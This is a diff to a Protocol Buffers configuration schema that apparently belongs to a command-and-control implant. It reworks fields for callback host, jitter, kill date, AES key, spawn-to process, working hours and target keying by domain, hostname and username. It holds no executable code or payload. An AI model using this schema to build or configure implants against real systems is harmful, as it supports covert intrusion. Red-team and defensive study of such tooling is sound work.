@@ -4,32 +4,44 @@ package config;
 
 message Config {
   bytes uuid = 1;
-  uint32 working_hours_start = 2;
-  uint32 working_hours_end = 3;
-  uint32 connection_retries = 4;
+  InitAction initaction = 2;
+  sint32 connection_retries = 3;
+  WorkingHours working_hours = 4;
   optional bytes domains = 5;
   optional bytes hostnames = 6;
   optional bytes usernames = 7;
   string spawn_to = 8;
-  optional HttpConfig http = 9;
+  bool tlsuntrusted = 9;
+  optional HttpConfig http = 10;
 }
+
+message WorkingHours {
+  uint32 start = 1;
+  uint32 end = 2;
+  bool use_system_tz = 3;
+  sint32 utc_offset = 4;
+}
+
+enum InitAction { NONE = 0; THREAD = 1; FORK = 2; }
 
 message HttpConfig {
   uint32 callback_port = 1;
   uint64 killdate = 2;
   uint32 callback_jitter = 3;
-  map<string, string> headers = 4;
-  optional bytes aes_key = 5;
-  string callback_host = 6;
-  string get_uri = 7;
-  string post_uri = 8;
-  string query_path_name = 9;
-  optional ProxyInfo proxy = 10;
-  uint32 callback_interval = 11;
+  bool eke = 4;
+  map<string, string> headers = 5;
+  optional bytes aes_key = 6;
+  string callback_host = 7;
+  string get_uri = 8;
+  string post_uri = 9;
+  string query_path_name = 10;
+  optional ProxyInfo proxy = 11;
+  uint32 callback_interval = 12;
 }
 
 message ProxyInfo {
-  string host = 1;
-  uint32 port = 2;
-  string pass = 3;
+  string user = 1;
+  string host = 2;
+  uint32 port = 3;
+  string pass = 4;
 }
